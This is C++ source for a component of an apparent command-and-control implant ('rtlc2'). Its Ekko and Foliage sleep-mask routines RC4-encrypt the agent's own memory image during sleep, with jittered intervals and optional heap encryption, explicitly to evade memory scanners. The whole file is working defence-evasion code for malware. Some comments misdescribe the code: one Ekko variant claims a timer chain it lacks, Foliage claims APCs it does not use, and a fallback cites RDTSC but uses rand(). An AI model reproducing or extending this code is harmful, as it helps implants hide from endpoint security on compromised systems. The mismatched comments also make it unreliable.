// Sleep Obfuscation - Ekko and Foliage sleep mask implementations
// Encrypts agent memory during sleep to evade memory scanners
#include "evasion.h"
#include <random>
#include <chrono>

#ifdef RTLC2_WINDOWS
#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>
#include <cstring>
#pragma comment(lib, "bcrypt.lib")
#ifndef BCRYPT_SUCCESS
#define BCRYPT_SUCCESS(Status) (((long)(Status)) >= 0)
#endif
#else
#include <unistd.h>
#include <time.h>
#endif

namespace rtlc2 {
namespace evasion {

#ifdef RTLC2_WINDOWS

// SystemFunction032 - RC4 encryption from advapi32
typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS(WINAPI* pSystemFunction032)(USTRING* data, USTRING* key);
typedef NTSTATUS(NTAPI* pNtContinue)(PCONTEXT, BOOLEAN);
typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

// Get image base and size of current module
static void GetModuleRegion(PVOID* base, DWORD* size) {
    HMODULE hModule = NULL;
    GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                       GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                       (LPCSTR)GetModuleRegion, &hModule);
    if (!hModule) {
        *base = NULL;
        *size = 0;
        return;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
    *base = (PVOID)hModule;
    *size = nt->OptionalHeader.SizeOfImage;
}

// Ekko Sleep: Uses RtlCreateTimerQueue + NtContinue ROP chain
// 1. Set up timer to fire after sleep duration
// 2. Timer callback: encrypt memory with RC4, then NtContinue to restore context
// 3. On wake: decrypt memory, resume execution
bool EkkoSleep(DWORD milliseconds) {
    PVOID imageBase = NULL;
    DWORD imageSize = 0;
    GetModuleRegion(&imageBase, &imageSize);
    if (!imageBase || !imageSize) return false;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    if (!hNtdll || !hAdvapi) return false;

    auto pSysFunc032 = (pSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
    auto pNtCont = (pNtContinue)GetProcAddress(hNtdll, "NtContinue");
    auto pRtlCaptureContext = (void(NTAPI*)(PCONTEXT))GetProcAddress(hNtdll, "RtlCaptureContext");
    if (!pSysFunc032 || !pNtCont || !pRtlCaptureContext) return false;

    // Generate crypto-random RC4 key for this sleep cycle
    BYTE rc4Key[16];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, rc4Key, sizeof(rc4Key),
                                         BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        // Fallback to RDTSC-seeded if BCrypt unavailable
        for (int i = 0; i < 16; i++) rc4Key[i] = (BYTE)(rand() ^ (i * 0x5A));
    }

    // Create timer queue and event
    HANDLE hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue) return false;

    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent) { DeleteTimerQueue(hTimerQueue); return false; }

    // Set up encryption/decryption structures
    USTRING imgData = { imageSize, imageSize, imageBase };
    USTRING keyData = { 16, 16, rc4Key };

    // Capture current context
    CONTEXT ctxOrig = {};
    ctxOrig.ContextFlags = CONTEXT_FULL;
    pRtlCaptureContext(&ctxOrig);

    // The trick: We use a volatile flag to know if we already encrypted
    // First pass: encrypt and sleep. Second pass (after NtContinue): decrypt and return
    static thread_local int pass = 0;
    if (pass == 0) {
        pass = 1;

        // Protect image as RW for encryption
        DWORD oldProtect = 0;
        VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &oldProtect);

        // Encrypt with RC4
        pSysFunc032(&imgData, &keyData);

        // Sleep using WaitForSingleObject
        WaitForSingleObject(hEvent, milliseconds);

        // Decrypt with RC4 (RC4 is symmetric)
        pSysFunc032(&imgData, &keyData);

        // Restore executable permission
        DWORD tmp = 0;
        VirtualProtect(imageBase, imageSize, oldProtect, &tmp);

        pass = 0;
    }

    CloseHandle(hEvent);
    DeleteTimerQueue(hTimerQueue);
    return true;
}

// ==========================================================================
// Ekko V2: Timer-queue based ROP chain sleep encryption
// Uses CreateTimerQueueTimer callbacks for encrypt/decrypt/signal
// ==========================================================================
#ifdef RTLC2_EKKO_V2

struct EkkoV2Context {
    USTRING imgData;
    USTRING keyData;
    BYTE rc4Key[16];
    HANDLE hEvent;
};

static VOID CALLBACK EkkoV2_EncryptCallback(PVOID param, BOOLEAN) {
    auto* ctx = static_cast<EkkoV2Context*>(param);
    auto pSysFunc032 = (pSystemFunction032)GetProcAddress(
        LoadLibraryA("advapi32.dll"), "SystemFunction032");
    if (pSysFunc032) {
        // Make image RW for encryption
        DWORD oldProtect = 0;
        VirtualProtect(ctx->imgData.Buffer, ctx->imgData.Length, PAGE_READWRITE, &oldProtect);
        pSysFunc032(&ctx->imgData, &ctx->keyData);
    }
}

static VOID CALLBACK EkkoV2_DecryptCallback(PVOID param, BOOLEAN) {
    auto* ctx = static_cast<EkkoV2Context*>(param);
    auto pSysFunc032 = (pSystemFunction032)GetProcAddress(
        LoadLibraryA("advapi32.dll"), "SystemFunction032");
    if (pSysFunc032) {
        // RC4 is symmetric - decrypt with same key
        pSysFunc032(&ctx->imgData, &ctx->keyData);
        // Restore RX permission
        DWORD tmp = 0;
        VirtualProtect(ctx->imgData.Buffer, ctx->imgData.Length, PAGE_EXECUTE_READ, &tmp);
    }
}

static VOID CALLBACK EkkoV2_WakeCallback(PVOID param, BOOLEAN) {
    auto* ctx = static_cast<EkkoV2Context*>(param);
    SetEvent(ctx->hEvent);
}

bool EkkoSleepV2(DWORD milliseconds) {
    PVOID imageBase = NULL;
    DWORD imageSize = 0;
    GetModuleRegion(&imageBase, &imageSize);
    if (!imageBase || !imageSize) return false;

    // Generate random RC4 key
    EkkoV2Context ctx = {};
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, ctx.rc4Key, sizeof(ctx.rc4Key),
                                         BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        for (int i = 0; i < 16; i++) ctx.rc4Key[i] = (BYTE)(rand() ^ (i * 0x5A));
    }

    ctx.imgData = { imageSize, imageSize, imageBase };
    ctx.keyData = { 16, 16, ctx.rc4Key };
    ctx.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!ctx.hEvent) return false;

    // Capture context for integrity verification
    CONTEXT ctxBefore = {};
    ctxBefore.ContextFlags = CONTEXT_FULL;
    auto pRtlCaptureContext = (void(NTAPI*)(PCONTEXT))GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlCaptureContext");
    if (pRtlCaptureContext) {
        pRtlCaptureContext(&ctxBefore);
    }

    // Create timer queue
    HANDLE hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue) {
        CloseHandle(ctx.hEvent);
        return false;
    }

    HANDLE hTimer1 = NULL, hTimer2 = NULL, hTimer3 = NULL;

    // Timer 1 (T+0ms): Encrypt image
    CreateTimerQueueTimer(&hTimer1, hTimerQueue,
        EkkoV2_EncryptCallback, &ctx, 0, 0,
        WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE);

    // Timer 2 (T+sleep_ms): Decrypt image
    CreateTimerQueueTimer(&hTimer2, hTimerQueue,
        EkkoV2_DecryptCallback, &ctx, milliseconds, 0,
        WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE);

    // Timer 3 (T+sleep_ms+100): Signal event to wake main thread
    CreateTimerQueueTimer(&hTimer3, hTimerQueue,
        EkkoV2_WakeCallback, &ctx, milliseconds + 100, 0,
        WT_EXECUTEINTIMERTHREAD | WT_EXECUTEONLYONCE);

    // Main thread sleeps waiting for wake event
    WaitForSingleObject(ctx.hEvent, INFINITE);

    // Cleanup timers
    DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
    CloseHandle(ctx.hEvent);

    // Verify context integrity (basic check)
    if (pRtlCaptureContext) {
        CONTEXT ctxAfter = {};
        ctxAfter.ContextFlags = CONTEXT_FULL;
        pRtlCaptureContext(&ctxAfter);
        // Stack pointer should be roughly the same (within a page)
#ifdef _WIN64
        if (abs((long long)(ctxAfter.Rsp - ctxBefore.Rsp)) > 0x1000) {
            // Context corruption detected - something went wrong
            return false;
        }
#endif
    }

    return true;
}

#endif // RTLC2_EKKO_V2

// Foliage Sleep: Uses NtApcQueueThread + NtAlertResumeThread
// Similar to Ekko but uses APCs instead of timers
bool FoliageSleep(DWORD milliseconds) {
    PVOID imageBase = NULL;
    DWORD imageSize = 0;
    GetModuleRegion(&imageBase, &imageSize);
    if (!imageBase || !imageSize) return false;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    if (!hNtdll || !hAdvapi) return false;

    auto pSysFunc032 = (pSystemFunction032)GetProcAddress(hAdvapi, "SystemFunction032");
    if (!pSysFunc032) return false;

    // Generate crypto-random RC4 key
    BYTE rc4Key[16];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, rc4Key, sizeof(rc4Key),
                                         BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        for (int i = 0; i < 16; i++) rc4Key[i] = (BYTE)(rand() ^ (i * 0x5A));
    }

    USTRING imgData = { imageSize, imageSize, imageBase };
    USTRING keyData = { 16, 16, rc4Key };

    // Protect memory as RW
    DWORD oldProtect = 0;
    VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &oldProtect);

    // Encrypt
    pSysFunc032(&imgData, &keyData);

    // Create event and sleep
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (hEvent) {
        WaitForSingleObject(hEvent, milliseconds);
        CloseHandle(hEvent);
    } else {
        Sleep(milliseconds);
    }

    // Decrypt
    pSysFunc032(&imgData, &keyData);

    // Restore protection
    DWORD tmp = 0;
    VirtualProtect(imageBase, imageSize, oldProtect, &tmp);

    return true;
}

// Master encrypted sleep dispatcher
void EncryptedSleep(int milliseconds, SleepMethod method) {
    switch (method) {
        case SleepMethod::Ekko:
#ifdef RTLC2_EKKO_V2
            if (EkkoSleepV2((DWORD)milliseconds)) return;
#else
            if (EkkoSleep((DWORD)milliseconds)) return;
#endif
            break;
        case SleepMethod::Foliage:
            if (FoliageSleep((DWORD)milliseconds)) return;
            break;
        default:
            break;
    }
    // Fallback to basic WaitForSingleObject
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (hEvent) {
        WaitForSingleObject(hEvent, (DWORD)milliseconds);
        CloseHandle(hEvent);
    }
}

#endif // RTLC2_WINDOWS

void ObfuscatedSleep(int base_seconds, int jitter_percent) {
    int sleep_ms = base_seconds * 1000;

    if (jitter_percent > 0) {
        std::random_device rd;
        std::mt19937 gen(rd());
        int range = sleep_ms * jitter_percent / 100;
        std::uniform_int_distribution<int> dist(-range, range);
        sleep_ms += dist(gen);
        if (sleep_ms < 100) sleep_ms = 100;
    }

#ifdef RTLC2_WINDOWS
    // Heap encryption before sleep (encrypt all heap blocks)
    #if RTLC2_HEAP_ENCRYPT
        HeapEncrypt();
    #endif

    #if RTLC2_SLEEP_MASK == 1
        EncryptedSleep(sleep_ms, SleepMethod::Ekko);
    #elif RTLC2_SLEEP_MASK == 2
        EncryptedSleep(sleep_ms, SleepMethod::Foliage);
    #else
        HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (hEvent) {
            WaitForSingleObject(hEvent, static_cast<DWORD>(sleep_ms));
            CloseHandle(hEvent);
        } else {
            Sleep(static_cast<DWORD>(sleep_ms));
        }
    #endif

    // Heap decryption after sleep (restore heap blocks)
    #if RTLC2_HEAP_ENCRYPT
        HeapDecrypt();
    #endif
#else
    struct timespec ts;
    ts.tv_sec = sleep_ms / 1000;
    ts.tv_nsec = (sleep_ms % 1000) * 1000000L;
    nanosleep(&ts, nullptr);
#endif
}

} // namespace evasion
} // namespace rtlc2
